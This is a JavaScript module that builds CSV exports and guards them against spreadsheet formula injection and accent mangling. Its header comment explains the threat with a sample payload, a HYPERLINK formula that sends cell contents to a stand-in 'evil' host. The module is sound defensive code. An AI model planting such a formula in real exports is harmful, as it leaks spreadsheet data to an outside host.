/**
 * CSV GENERATION
 *
 * Two things here are not obvious and both matter.
 *
 * 1. FORMULA INJECTION
 *    A cell whose text begins with = + - @ (or tab/CR) is interpreted as a FORMULA by Excel,
 *    LibreOffice and Google Sheets. Project titles and locations on this platform are typed
 *    by admins and contractors, so a title like
 *        =HYPERLINK("http://evil/?"&A1,"Click")
 *    would execute in the spreadsheet of every journalist who opened our export. The export
 *    exists so outsiders can audit us; shipping them a weaponised file would be a
 *    spectacular way to destroy that trust.
 *
 *    Dangerous leading characters are prefixed with a single quote, which spreadsheets treat
 *    as "this is text" and hide from display. The value is preserved, not stripped.
 *
 * 2. THE UTF-8 BOM
 *    Excel on Windows assumes the local ANSI codepage unless a file starts with a byte order
 *    mark, so "Yaoundé" and "Edéa" arrive as "YaoundÃ©". Cameroonian place names carry
 *    accents constantly, so an export without a BOM is mangled for most of the audience it
 *    is written for.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * escapeCell
 * Quotes, escapes and de-weaponises a single value.
 */
export const escapeCell = (value) => {
    if (value === null || value === undefined) return '';

    // Numbers bypass the formula guard, and this is deliberate.
    //
    // A negative number starts with '-', which the guard would quote into text. That would
    // wreck `variance_points` — the headline column, negative exactly when a project is in
    // trouble — leaving analysts unable to sort or filter on the one number the export
    // exists to publish. Injection arrives as user-entered STRINGS; a JS number is produced
    // by our own serialisation and cannot carry a payload.
    if (typeof value === 'number' && Number.isFinite(value)) {
        return String(value);
    }

    let text = String(value);

    // Neutralise formulas BEFORE quoting, so the guard survives the quoting.
    if (FORMULA_PREFIX.test(text)) {
        text = `'${text}`;
    }

    // RFC 4180: wrap in quotes when the value contains a delimiter, quote or newline, and
    // double any internal quotes.
    if (/[",\r\n]/.test(text)) {
        text = `"${text.replace(/"/g, '""')}"`;
    }

    return text;
};

/**
 * toCsv
 * @param {Array<{key: string, header: string}>} columns  order and naming of the output
 * @param {Array<object>} rows
 * @param {{bom?: boolean}} options
 *
 * Column headers are explicit rather than derived from object keys: an export is a published
 * contract, and it should not silently gain or lose columns because someone added a field to
 * an internal object.
 */
export const toCsv = (columns, rows, { bom = true } = {}) => {
    const lines = [columns.map((c) => escapeCell(c.header)).join(',')];

    for (const row of rows) {
        lines.push(columns.map((c) => escapeCell(row[c.key])).join(','));
    }

    // CRLF per RFC 4180 — the format most spreadsheet software expects.
    const body = lines.join('\r\n');

    return bom ? `﻿${body}` : body;
};
